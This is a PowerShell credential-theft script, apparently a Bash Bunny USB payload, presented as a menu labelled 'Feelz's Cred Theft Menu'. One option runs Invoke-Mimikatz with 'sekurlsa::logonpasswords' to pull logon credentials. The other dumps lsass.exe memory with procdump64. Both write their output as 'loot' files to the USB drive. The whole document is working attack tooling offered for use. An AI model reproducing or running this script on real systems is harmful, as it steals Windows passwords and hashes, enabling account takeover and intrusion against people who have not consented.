function Invoke-PowershellMimikatz {
	try{
    Write-Host ">>> Attempting to get creds with mimikatz"
    $bunny = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq "BashBunny" } | Select-Object -ExpandProperty DriveLetter
	$hostname = $env:COMPUTERNAME
	$time = Get-Date -Format "yyyyMMdd_HHmmss"
	$outfile = "$bunny\loot\HASHES_${hostname}_$time.txt"
	. $bunny\payloads\library\LsassAttack\CredTools\Invoke-Mimikatz.ps1 
	}
	Catch{ Write-Host ">>> Failed to access Bunny drive";sleep 1;return}
	try{	
	Invoke-Mimikatz -Command "sekurlsa::logonpasswords" | Out-File -FilePath $outfile -Append
	Write-Host ">>> Hashes Collected."
    Write-Host ">>> Hashes saved to $outfile"
	Start-Sleep -Seconds 1
    Read-Host ">>> Press enter to continue"
	}
	catch{write-host ">>> Password Grab Failed"; sleep 1; return}
}

function Invoke-LsassDump {
    Write-Host ">>> Attempting to create lsass minidump"
    push-Location
    try{
    $bunny = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq "BashBunny" } | Select-Object -ExpandProperty DriveLetter
	$hostname = $env:COMPUTERNAME
	$time = Get-Date -Format "yyyyMMdd_HHmmss"
	$outfile = "$bunny\loot\lsass.exe_${hostname}_$time.dmp"
    }
    catch{Write-host ">>>Unable to mount Bunny drive";sleep 2; return}
    try{
    cd $bunny\payloads\library\LsassAttack\CredTools\
    .\procdump64.exe -ma -accepteula lsass.exe $outfile
    Start-Sleep -Seconds 1
    Write-Host ">>> Dump file created"
    Write-Host ">>> Written to $outfile"
    Pop-Location
    Read-Host ">>> Press enter to continue"
    }
    catch{Write-Host ">>>Failed to create minidump";sleep 1;pop-location;return}
    
}

Function Show-Menu {
Clear
Write-Host "========================="
Write-Host " Feelz's Cred Theft Menu"
Write-Host "========================="
Write-Host "1) Attempt to get creds w/ mimikatz"
Write-Host "2) Attempt LSASS.exe minidump"
Write-Host "3) Exit"
Write-Host ""
}


do {
Show-Menu
$choice = Read-Host "Select Option?"
switch ($choice) {
    "1" { Invoke-PowershellMimikatz }
    "2" { Invoke-LsassDump }
    "3" { Clear;Write-Host "Exiting";sleep 1;clear;exit}
    default { Write-Warning "Invalid choice. Try again." }
}
} while ($true)
